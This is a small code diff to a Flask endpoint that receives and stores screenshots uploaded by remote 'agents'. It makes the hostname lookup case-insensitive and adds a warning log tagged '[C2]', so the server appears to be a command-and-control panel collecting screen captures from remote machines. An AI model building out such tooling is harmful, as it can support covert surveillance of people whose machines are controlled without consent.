@@ -155,8 +155,10 @@ def upload_screenshot(agent_id):
 @control_bp.route("/api/screenshot/<string:hostname>", methods=["POST"])
 @require_token
 def upload_screenshot_by_hostname(hostname):
-    agent = Agent.query.filter_by(original_hostname=hostname).order_by(Agent.id.desc()).first()
+    # Case-insensitive lookup for original_hostname
+    agent = Agent.query.filter(Agent.original_hostname.ilike(hostname)).order_by(Agent.id.desc()).first()
     if not agent:
+        log.warning(f"[C2] Screenshot upload failed: Agent {hostname} not found")
         return jsonify({"error": "Agent not found"}), 404
     data = request.get_json(silent=True) or {}
     agent.last_screenshot = data.get("screenshot_b64")
